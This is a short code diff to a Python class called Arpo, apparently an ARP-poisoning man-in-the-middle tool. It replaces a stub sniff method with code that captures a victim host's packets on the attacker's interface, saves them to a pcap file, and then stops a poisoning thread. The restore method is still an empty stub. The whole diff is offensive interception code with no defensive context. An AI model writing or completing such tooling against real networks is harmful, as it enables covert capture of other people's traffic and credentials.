@@ -72,8 +72,18 @@ class Arpo:
             time.sleep(2)
 
 
-    def sniff(self, count=200):
-        pass
+    def sniff(self, count=100):
+        time.sleep(5)
+        print(f'Sniffing {count} packets')
+        bpf_filter = "ip host %s" % victim
+        packets = sniff(count=count, filter=bpf_filter, 
+                        iface=self.interface)
+        wrpcap('arpo.pcap', packets)
+        print('Got the packets')
+        self.restore()
+        self.poison_thread.terminate()
+        print('Finished.')
+
 
     def restore(self):
         pass
